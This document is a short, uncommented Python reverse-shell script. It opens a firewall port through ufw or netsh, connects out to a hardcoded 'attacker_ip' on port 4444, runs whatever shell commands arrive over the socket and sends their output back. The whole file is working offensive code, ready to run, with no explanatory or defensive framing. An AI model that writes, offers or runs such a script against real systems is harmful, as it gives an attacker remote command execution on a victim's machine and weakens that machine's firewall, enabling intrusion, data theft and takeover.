import socket
import subprocess
import os
import platform

def configure_firewall(port):
    os_name = platform.system().lower()
    try:
        if os_name == 'linux':
            subprocess.run(["sudo", "ufw", "allow", str(port)], check=True)
        elif os_name == 'windows':
            subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule", f"name=Open Port {port}", "dir=in", "action=allow", "protocol=TCP", f"localport={port}"], check=True)
        print(f"Port {port} opened successfully.")
    except Exception as e:
        print(f"Failed to configure firewall: {e}")

def connect(attacker_ip, attacker_port):
    configure_firewall(attacker_port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    
    while True:
        command = s.recv(1024).decode('utf-8')
        
        if command.lower() == "exit":
            break
        
        if command.startswith("cd "):
            try:
                os.chdir(command[3:])
                s.send(b"Changed directory\n")
            except Exception as e:
                s.send(str(e).encode('utf-8'))
            continue
        
        output = subprocess.getoutput(command)
        s.send(output.encode('utf-8'))
    
    s.close()

if __name__ == "__main__":
    attacker_ip = "192.168.1.158"  
    attacker_port = 4444  
    connect(attacker_ip, attacker_port)
